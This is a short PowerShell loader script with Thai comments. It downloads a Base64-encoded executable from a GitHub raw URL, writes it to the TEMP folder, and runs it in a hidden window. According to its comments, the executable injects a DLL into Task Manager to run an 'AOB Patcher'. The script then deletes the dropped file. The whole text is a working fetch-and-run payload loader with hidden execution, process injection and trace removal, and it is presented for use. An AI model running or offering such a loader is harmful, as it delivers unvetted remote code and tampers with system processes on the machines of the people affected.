# load.ps1
$url = "https://raw.githubusercontent.com/puddyeieiei/dydestiny/main/injector.b64"

Write-Host "[*] Downloading injector from GitHub..." -ForegroundColor Cyan

try {
    # ดาวน์โหลด Base64
    $base64 = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
    
    # แปลง Base64 เป็น bytes
    $bytes = [Convert]::FromBase64String($base64)
    
    # เขียนไฟล์ชั่วคราว
    $tempFile = "$env:TEMP\injector.exe"
    [System.IO.File]::WriteAllBytes($tempFile, $bytes)
    
    Write-Host "[*] Running injector..." -ForegroundColor Cyan
    
    # รัน injector (它会自动เปิด Task Manager และ inject Taskmgr.dll)
    $process = Start-Process -FilePath $tempFile -WindowStyle Hidden -PassThru
    
    # รอให้ injector ทำงานเสร็จ
    $process.WaitForExit()
    
    # ทำความสะอาด
    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
    
    Write-Host "[+] Success! Task Manager with AOB Patcher is running!" -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed: $_" -ForegroundColor Red
}
